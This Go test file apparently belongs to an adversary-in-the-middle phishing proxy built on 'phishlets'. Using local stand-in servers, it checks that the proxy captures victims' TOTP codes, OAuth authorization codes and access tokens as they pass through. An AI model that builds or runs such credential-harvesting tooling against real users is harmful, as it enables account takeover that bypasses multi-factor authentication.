package proxy

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/core/phishlet"
	"github.com/phantom-v2/phantom/core/session"
	"github.com/phantom-v2/phantom/internal/events"
)

type tapBus struct {
	inner *events.Bus
	mu    sync.Mutex
	got   map[string][]any
}

func newTap() *tapBus {
	return &tapBus{inner: events.New(), got: map[string][]any{}}
}

func (t *tapBus) Publish(ctx context.Context, topic string, payload any) error {
	t.mu.Lock()
	t.got[topic] = append(t.got[topic], payload)
	t.mu.Unlock()
	return t.inner.Publish(ctx, topic, payload)
}

func (t *tapBus) count(topic string) int {
	t.mu.Lock()
	defer t.mu.Unlock()
	return len(t.got[topic])
}

func waitFor(t *testing.T, cond func() bool) {
	t.Helper()
	if cond() {
		return
	}
	t.Fatal("condition false (tap is synchronous, no retry)")
}

func TestMFACapture(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.HasSuffix(r.URL.Path, "/verify"):
			w.WriteHeader(http.StatusOK)
		case strings.HasSuffix(r.URL.Path, "/oauth"):
			w.Header().Set("Location", "https://login.phish.test/cb?code=abc123")
			w.WriteHeader(http.StatusFound)
		case strings.HasSuffix(r.URL.Path, "/token"):
			w.Header().Set("Content-Type", "application/json")
			_, _ = io.WriteString(w, `{"access_token":"tok123","token_type":"bearer"}`)
		default:
			w.WriteHeader(http.StatusOK)
		}
	}))
	defer upstream.Close()

	st := phishlet.NewStore()
	if err := st.LoadDir("../../configs/phishlets"); err != nil {
		t.Fatal(err)
	}
	if ph := st.FindByID("labtest"); ph != nil {
		ph.MfaTokens = []core.MfaRule{{Key: "totp", Search: "totp_code"}}
	}
	tap := newTap()
	eng := New(st, session.NewMemory(0), tap)
	eng.SetUpstream(map[string]string{"origin.upstream.test": upstream.URL})

	ua := func(r *http.Request) {
		r.Header.Set("User-Agent", "Mozilla/5.0 Chrome/126")
		r.Header.Set("Accept-Language", "en-US")
		r.Header.Set("Accept", "*/*")
	}
	// TOTP в POST.
	req := httptest.NewRequest(http.MethodPost, "http://login.phish.test/verify",
		strings.NewReader("totp_code=123456"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	ua(req)
	eng.ServeHTTP(httptest.NewRecorder(), req)
	waitFor(t, func() bool { return tap.count("capture.mfa") >= 1 })

	// OAuth редирект с code (не следуем — проверяем Location rewrite + capture).
	req2 := httptest.NewRequest(http.MethodGet, "http://login.phish.test/oauth", nil)
	ua(req2)
	rec2 := httptest.NewRecorder()
	eng.ServeHTTP(rec2, req2)
	if loc := rec2.Result().Header.Get("Location"); !strings.Contains(loc, "code=abc123") {
		t.Fatalf("location lost: %q", loc)
	}
	waitFor(t, func() bool { return tap.count("capture.token") >= 1 })

	// JSON token exchange.
	n := tap.count("capture.token")
	req3 := httptest.NewRequest(http.MethodGet, "http://login.phish.test/token", nil)
	ua(req3)
	rec3 := httptest.NewRecorder()
	eng.ServeHTTP(rec3, req3)
	if !strings.Contains(rec3.Body.String(), "tok123") {
		t.Fatalf("token body lost: %q", rec3.Body.String())
	}
	waitFor(t, func() bool { return tap.count("capture.token") > n })
}
